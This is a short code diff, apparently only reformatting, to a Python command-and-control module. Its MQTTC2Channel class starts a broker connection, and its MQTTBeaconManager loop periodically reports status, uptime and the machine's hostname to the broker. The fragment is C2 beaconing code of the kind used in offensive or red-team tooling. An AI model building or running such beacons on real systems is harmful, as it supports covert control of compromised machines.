@@ -67,8 +67,7 @@ class MQTTC2Channel:
             self._thread = threading.Thread(target=self.client.loop_forever, daemon=True)
             self._thread.start()
             logger.info(
-                f"MQTT C2 started: broker={self.broker}:{self.port} "
-                f"client={self.client_id}"
+                f"MQTT C2 started: broker={self.broker}:{self.port} " f"client={self.client_id}"
             )
             return True
         except Exception as e:
@@ -179,9 +178,11 @@ class MQTTBeaconManager:
     def _beacon_loop(self):
         while self._running:
             if self.channel.is_connected:
-                self.channel.beacon({
-                    "status": "active",
-                    "uptime": time.time(),
-                    "hostname": os.uname().nodename,
-                })
+                self.channel.beacon(
+                    {
+                        "status": "active",
+                        "uptime": time.time(),
+                        "hostname": os.uname().nodename,
+                    }
+                )
             time.sleep(self.interval)
